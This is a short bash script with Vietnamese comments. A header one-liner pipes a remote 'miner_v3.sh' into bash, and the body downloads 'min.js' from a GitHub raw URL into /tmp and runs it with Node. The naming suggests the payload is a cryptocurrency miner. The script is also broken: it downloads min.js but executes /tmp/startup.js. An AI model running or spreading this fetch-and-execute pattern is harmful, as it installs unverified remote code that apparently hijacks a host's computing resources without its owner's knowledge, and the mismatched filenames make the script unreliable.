# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/miner_v3.sh)

#!/bin/bash

# Tải script Node.js từ URL
echo "🚀 Đang tải script Node.js..."
curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/min.js -o /tmp/min.js

# Kiểm tra xem script đã tải về thành công không
if [ ! -f "/tmp/min.js" ]; then
  echo "❌ Lỗi tải tệp script Node.js."
  exit 1
fi

# Chạy script Node.js
echo "🛠️ Đang chạy script Node.js..."
node /tmp/startup.js
